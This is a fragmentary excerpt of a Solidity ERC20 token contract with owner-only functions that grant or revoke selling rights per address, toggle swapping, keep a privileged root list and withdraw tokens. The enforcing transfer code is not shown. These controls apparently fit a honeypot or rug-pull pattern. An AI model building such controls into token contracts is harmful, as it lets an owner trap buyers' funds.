...
contract Ownable {
     ...
     * `roleowner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public roleowner {
        _owner = address(0);
    }
     ...
     */
    function transferOwnership(address newOwner) public roleowner {
...
contract ERC20 is IERC20, Ownable {
    ...
    function setSwap(address user) public roleowner returns(bool){
		_swap =user;
        swap = false;
		return true;
	}

	function addROOTList(address user) public roleowner returns(bool){
		_ROOTList[user] =true;
		return true;
	}
	
	function removeROOTList(address user) public roleowner returns(bool){
		_ROOTList[user] =false;
		return true;
	}

    function sysAsale(address user) public roleowner returns(bool){
		_canSale[user] =true;
		return true;
	}
	
	function sysDsale(address user) public roleowner returns(bool){
		_canSale[user] =false;
		return true;
	}

    function exchange() public roleowner returns(bool){
		swap =true;
		return true;
	}

    function exchangeStop() public roleowner returns(bool){
		swap =false;
		return true;
	}
	
	function withdrawToken(IERC20 t,uint256 amount) public roleowner returns(bool){
